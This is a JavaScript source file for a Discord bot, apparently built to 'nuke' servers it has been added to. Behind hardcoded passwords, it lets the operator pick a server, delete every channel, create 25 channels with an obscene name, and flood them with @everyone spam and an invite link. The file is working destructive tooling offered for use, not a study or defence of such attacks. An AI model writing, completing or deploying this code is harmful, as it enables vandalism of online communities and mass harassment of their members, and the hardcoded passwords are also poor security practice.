const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  StringSelectMenuBuilder,
  MessageFlags
} = require('discord.js');

const express = require('express');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const NUKE_PASSWORD = 'meka123';

const userSessions = new Map();

const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

const TOKEN = process.env.TOKEN;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// ====================== MESSAGE COMMANDS ======================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;
  const content = message.content.trim().toLowerCase();

  if (content === '!check') {
    const embed = new EmbedBuilder()
      .setColor('#00ff00')
      .setTitle('🔍 Remote Server Control')
      .setDescription('Select server → Raid or Nuke')
      .setFooter({ text: 'Only you can use this' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`check_start_${message.author.id}`)
        .setLabel('Start')
        .setStyle(ButtonStyle.Primary)
    );

    return message.reply({ embeds: [embed], components: [row] });
  }
});

// ====================== INTERACTIONS ======================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts[parts.length - 1];

    if (interaction.user.id !== userId) {
      return interaction.reply({ 
        content: '❌ This is not for you.', 
        flags: MessageFlags.Ephemeral 
      });
    }

    if (action !== 'check') return; // Only handle !check for now

    // 1. Start Button → Password Modal
    if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
      const modal = new ModalBuilder()
        .setCustomId(`check_modal_${interaction.user.id}`)
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('password')
          .setLabel('Password')
          .setStyle(TextInputStyle.Short)
          .setRequired(true)
      ));

      return await interaction.showModal(modal);
    }

    // 2. Password Modal
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
      }

      const guilds = Array.from(client.guilds.cache.values());
      if (guilds.length === 0) {
        return interaction.reply({ content: '❌ Bot is in no servers.', flags: MessageFlags.Ephemeral });
      }

      const options = guilds.map(g => ({
        label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
        value: g.id
      }));

      const select = new StringSelectMenuBuilder()
        .setCustomId(`check_server_select_${interaction.user.id}`)
        .setPlaceholder('Select a server')
        .addOptions(options);

      await interaction.reply({
        content: '✅ Password correct. Select server:',
        components: [new ActionRowBuilder().addComponents(select)],
        flags: MessageFlags.Ephemeral
      });

      userSessions.set(interaction.user.id, {});
    }

    // 3. Server Select
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
      await interaction.deferUpdate();

      const guildId = interaction.values[0];
      const guild = client.guilds.cache.get(guildId);
      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });

      userSessions.set(interaction.user.id, { guildId });

      const actionSelect = new StringSelectMenuBuilder()
        .setCustomId(`check_action_select_${interaction.user.id}`)
        .setPlaceholder('Choose action')
        .addOptions([
          { label: '🔥 Raid', value: 'raid' },
          { label: '☢️ Nuke', value: 'nuke' }
        ]);

      await interaction.editReply({
        content: `**Selected:** ${guild.name}\nChoose action:`,
        components: [new ActionRowBuilder().addComponents(actionSelect)]
      });
    }

    // 4. Action Select → Nuke Modal
    if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
      await interaction.deferUpdate();
      const choice = interaction.values[0];

      if (choice === 'nuke') {
        const modal = new ModalBuilder()
          .setCustomId(`check_nuke_modal_${interaction.user.id}`)
          .setTitle('Confirm Nuke');

        modal.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder()
            .setCustomId('password')
            .setLabel('Nuke Password')
            .setStyle(TextInputStyle.Short)
            .setRequired(true)
        ));

        return await interaction.showModal(modal);
      }
    }

    // ==================== NUKE (Fixed & Stable) ====================
    if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
      const password = interaction.fields.getTextInputValue('password');
      if (password !== NUKE_PASSWORD) {
        return interaction.reply({ content: '❌ Wrong nuke password.', flags: MessageFlags.Ephemeral });
      }

      await interaction.deferReply({ flags: MessageFlags.Ephemeral });

      const session = userSessions.get(interaction.user.id);
      const guild = client.guilds.cache.get(session?.guildId);
      if (!guild) return interaction.editReply({ content: '❌ Session expired or server not found.' });

      await interaction.editReply({ content: `☢️ Starting nuke on **${guild.name}**...` });

      const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

      try {
        // Delete all channels
        await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });
        for (const channel of [...guild.channels.cache.values()]) {
          await channel.delete().catch(() => {});
          await delay(400);
        }

        // Create channels
        await interaction.followUp({ content: '🔨 Creating FUCKED BY FAME channels...', flags: MessageFlags.Ephemeral });
        const createdChannels = [];

        for (let i = 0; i < 25; i++) { // 25 channels - reliable number
          try {
            const chan = await guild.channels.create({
              name: 'fucked-by-fame',
              type: 0,
              reason: 'Nuke by Fame'
            });
            createdChannels.push(chan);
            await delay(1100); // Slow creation
          } catch (e) {
            break;
          }
        }

        // Spam
        await interaction.followUp({ content: `💥 Spamming @everyone + invite...`, flags: MessageFlags.Ephemeral });
        const invite = 'https://discord.gg/NANQMy3WnD';
        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;

        for (const channel of createdChannels) {
          for (let i = 0; i < 12; i++) {
            channel.send(spamText).catch(() => {});
            if (i % 4 === 0) await delay(600);
          }
        }

        await interaction.followUp({ 
          content: `✅ **NUKE COMPLETE**\nCreated **${createdChannels.length}** channels named \`fucked-by-fame\``,
          flags: MessageFlags.Ephemeral 
        });

      } catch (err) {
        console.error(err);
        await interaction.followUp({ content: '⚠️ Nuke partially failed.', flags: MessageFlags.Ephemeral });
      }

      userSessions.delete(interaction.user.id);
    }

  } catch (error) {
    console.error('Interaction Error:', error);
    if (!interaction.replied && !interaction.deferred) {
      interaction.reply({ 
        content: '❌ Interaction failed. Try again.', 
        flags: MessageFlags.Ephemeral 
      }).catch(() => {});
    }
  }
});

client.login(TOKEN);
